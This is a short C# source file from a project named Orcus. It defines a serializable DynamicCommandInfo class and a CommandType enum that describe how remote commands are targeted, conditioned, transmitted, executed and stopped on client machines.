using System;
using System.Collections.Generic;

namespace Orcus.Shared.DynamicCommands
{
    /// <summary>
    ///     A dynamic command covers a static command. The dynamic command defines everything which is neccessary to customize
    ///     the behavior of the static command like setting targets, conditions, an execution event and a transmission event
    /// </summary>
    [Serializable]
    public abstract class DynamicCommandInfo
    {
        /// <summary>
        ///     The id of the underlying command
        /// </summary>
        public Guid CommandId { get; set; }

        /// <summary>
        ///     The type of the command
        /// </summary>
        public CommandType CommandType { get; set; }

        /// <summary>
        ///     The groups which are affected by this command. If null, then the group doesn't matter
        /// </summary>
        public CommandTarget Target { get; set; }

        /// <summary>
        ///     Some conditions if the command can be executed on the current client
        /// </summary>
        public List<Condition> Conditions { get; set; }

        /// <summary>
        ///     The moment when this command should be transmitted to the <see cref="Target" />
        /// </summary>
        public TransmissionEvent TransmissionEvent { get; set; }

        /// <summary>
        ///     The event when the command should be executed on the client's computer
        /// </summary>
        public ExecutionEvent ExecutionEvent { get; set; }

        /// <summary>
        ///     The event when the command should stop executing. This has no effect on a normal StaticCommand but only on an
        ///     ActiveStaticCommand. The command won't stop automatically if this property is null
        /// </summary>
        public StopEvent StopEvent { get; set; }

        /// <summary>
        ///     The md5 hash of the plugin. Null if the command comes with Orcus
        /// </summary>
        public byte[] PluginHash { get; set; }

        /// <summary>
        ///     The types needed for serialisation
        /// </summary>
        public static Type[] RequiredTypes
        {
            get
            {
                var result = new List<Type> {typeof (DynamicCommand)};
                result.AddRange(Condition.AbstractTypes);
                result.AddRange(CommandTarget.AbstractTypes);
                result.AddRange(TransmissionEvent.AbstractTypes);
                return result.ToArray();
            }
        }
    }

    /// <summary>
    ///     The type of a StaticCommand
    /// </summary>
    public enum CommandType
    {
        /// <summary>
        ///     A default StaticCommand which just gets executed
        /// </summary>
        Default,

        /// <summary>
        ///     A StaticCommand which does an action with an undefined duration (e. g. looping)
        /// </summary>
        Active
    }
}